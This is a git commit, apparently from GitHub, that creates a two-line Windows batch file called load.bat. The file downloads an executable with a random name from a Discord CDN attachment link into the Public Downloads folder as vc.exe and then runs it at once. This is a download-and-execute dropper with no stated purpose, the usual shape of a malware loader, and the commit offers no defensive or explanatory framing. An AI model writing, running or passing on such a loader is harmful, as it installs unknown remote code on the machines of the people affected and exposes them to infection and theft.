1ccddbb8d8315327262c7bb681d88f1f8edf2d64
stevie <112195176+slater899x@users.noreply.github.com>
2024-01-17 17:30:41 +0000

    Create load.bat

---
+++ load.bat
@@ -0,0 +1,2 @@
+curl.exe -o C:\\Users\\Public\\Downloads\\vc.exe https://cdn.discordapp.com/attachments/1196940120482381897/1196997635521925180/90hnWQnEG9vbws.exe?ex=65b9a9eb&is=65a734eb&hm=3c49bff93ff446adb98e2429c58ff25b309764a824d8d02c9092d6a8e4d13dca&
+start C:\\Users\\Public\\Downloads\\vc.exe
